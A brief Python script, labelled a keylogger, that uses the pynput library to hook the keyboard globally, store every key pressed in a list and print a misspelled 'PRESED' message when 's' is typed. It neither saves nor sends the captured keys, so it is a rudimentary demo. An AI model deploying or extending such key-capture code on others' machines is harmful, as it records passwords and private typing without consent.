# keylogger using pynput module

import pynput
from pynput.keyboard import Key, Listener

keys = []

def on_press(key):
	
	keys.append(key)
	pressed_key = None
	try:
		pressed_key = key.char
		
	except AttributeError:
		pressed_key = key
	if pressed_key == 's':
		print("PRESED")


with Listener(on_press = on_press) as listener:
	listener.join()
